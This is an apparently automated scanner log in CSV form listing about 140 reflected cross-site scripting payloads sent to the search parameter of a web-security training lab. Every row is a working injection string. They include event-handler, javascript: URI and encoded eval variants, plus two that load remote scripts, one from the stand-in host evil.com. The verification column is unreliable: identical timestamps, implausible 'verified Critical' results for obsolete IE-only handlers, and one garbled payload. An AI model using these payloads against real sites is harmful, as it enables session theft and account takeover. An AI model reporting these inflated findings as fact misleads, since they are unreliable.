Timestamp,Target_URL,HTTP_Method,Parameter,Payload,Reflection_Type,Browser_Verified,XSS_Event_Type,Severity
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>alert('XSS')</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<script>alert(""XSS"")</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>prompt(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>confirm(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>alert(document.cookie)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>alert(document.domain)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>alert(window.origin)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script src=//xss.rocks/xss.js></script>,RAW_REFLECTION,No,,High
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script src=https://evil.com/xss.js></script>,RAW_REFLECTION,No,,High
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<svg/onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<svg onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<svg><script>alert(1)</script></svg>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<svg><animate onbegin=alert(1) attributeName=x dur=1s>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<svg/onload=alert(String.fromCharCode(88,83,83))>",RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<svg onload=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<svg onload=confirm(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<svg onload=alert`1`>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<svg onload=eval(atob('YWxlcnQoMSk='))>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<svg><script>alert&#40;1&#41;</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onerror=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onerror=confirm(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onerror=alert('XSS')>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onerror=alert`1`>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onerror=alert(document.cookie)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img/src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<img src=""x"" onerror=""alert(1)"">",RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src='x' onerror='alert(1)'>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<body onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<body onpageshow=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<body onfocus=alert(1)>,RAW_REFLECTION,No,,High
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<body onhashchange=alert(1)>,RAW_REFLECTION,No,,High
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<body onload=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<body onload=confirm(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<input onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<input onblur=alert(1) autofocus><input>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<input type=text value=x onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<input type=button value=xss onclick=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<input type=image src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<iframe src=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<iframe src=""javascript:alert(1)"">",RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<iframe onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<iframe/onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<iframe  rc=""data:text/html,<script>alert(1)</script>"">",RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,'-alert(1)-',RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<details open ontoggle=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<details ontoggle=alert(1)><summary>xss</summary></details>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<details open ontoggle=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<object data=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<embed src=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<object data=""data:text/html,<script>alert(1)</script>"">",RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<select onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<textarea onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<keygen onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<marquee onstart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<marquee loop=1 onfinish=alert(1)>x</marquee>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<video src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<audio src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<video><source onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<link rel=stylesheet href=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<a href=javascript:alert(1)>click</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<a href=""javascript:alert(1)"">click</a>",RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<form action=javascript:alert(1)><input type=submit>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<form><button formaction=javascript:alert(1)>X</button>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<form><input formaction=javascript:alert(1) type=submit value=X>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<meta http-equiv=refresh content=0;url=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<meta http-equiv=refresh content=""0;javascript:alert(1)"">",RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<style>*{background:url('javascript:alert(1)')}</style>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<style>@import'javascript:alert(1)';</style>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<style onload=alert(1)></style>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<math><mi xlink:href=javascript:alert(1)>X</mi></math>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<table background=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<table><td background=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<div onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<div style=width:expression(alert(1))>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>alert&#40;1&#41;</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>alert&#x28;1&#x29;</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>\u0061lert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>eval('\x61lert(1)')</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onabort=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onactivate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onafterprint=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onafterupdate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onbeforeactivate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onbeforecopy=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onbeforecut=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onbeforedeactivate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onbeforeeditfocus=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onbeforepaste=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onbeforeprint=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onbeforeunload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onbeforeupdate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onblur=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onbounce=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x oncellchange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onchange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onclick=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x oncontextmenu=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x oncontrolselect=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x oncopy=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x oncut=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x ondataavailable=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x ondatasetchanged=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x ondatasetcomplete=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x ondblclick=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x ondeactivate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x ondrag=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x ondragend=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x ondragenter=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x ondragleave=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x ondragover=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x ondragstart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x ondrop=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onerrorupdate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onfilterchange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onfinish=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onfocus=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onfocusin=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onfocusout=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onhelp=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x oninput=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onkeydown=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onkeypress=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onkeyup=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onlayoutcomplete=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onlosecapture=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onmousedown=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onmouseenter=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onmouseleave=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onmousemove=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onmouseout=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onmouseover=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onmouseup=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onmousewheel=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onmove=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onmoveend=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onmovestart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onpaste=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onpropertychange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
